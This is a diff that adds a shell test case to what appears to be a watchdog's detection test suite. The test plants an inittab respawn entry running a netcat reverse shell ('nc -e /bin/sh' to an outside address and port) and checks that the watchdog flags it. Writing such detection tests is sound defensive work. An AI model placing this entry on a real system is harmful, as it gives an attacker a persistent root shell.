@@ -261,3 +261,20 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in inittab respawn: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. inittab respawn entries run AS ROOT
+    # continuously at the named runlevel — a recurring persistence
+    # vector (T1037 — Boot or Logon Initialization Scripts via SysV
+    # init). The respawn action restarts the named program if it
+    # exits, making the listener self-healing across attempts.
+    # Locks the netcat axis on the inittab boot-time-respawn root-
+    # exec persistence surface alongside the other variants.
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:nc -e /bin/sh 1.1.1.1 4444\n' > "${INITTAB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
